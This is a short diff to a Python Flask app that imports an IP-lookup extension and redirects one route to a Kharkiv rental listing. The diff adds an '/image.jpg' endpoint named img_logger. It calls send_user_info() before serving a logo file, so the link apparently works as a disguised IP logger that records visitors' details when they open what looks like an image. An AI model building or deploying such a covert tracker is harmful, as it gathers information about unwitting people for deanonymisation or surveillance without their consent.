@@ -1,5 +1,5 @@
 import requests
-from flask import Flask, redirect
+from flask import Flask, redirect, send_from_directory
 from flask_ipinfo import IPInfo
 
 app: Flask = Flask(__name__)
@@ -31,6 +31,12 @@ def crib_form():
     return redirect("https://rieltor.ua/harkov/flats-rent/view/9246735/")
 
 
+@app.route('/image.jpg', methods=['GET'])
+def img_logger():
+    uploads = 'logo.png'
+    send_user_info()
+    return send_from_directory(directory='.', filename=uploads)
+
+
 if __name__ == '__main__':
     app.run()
-
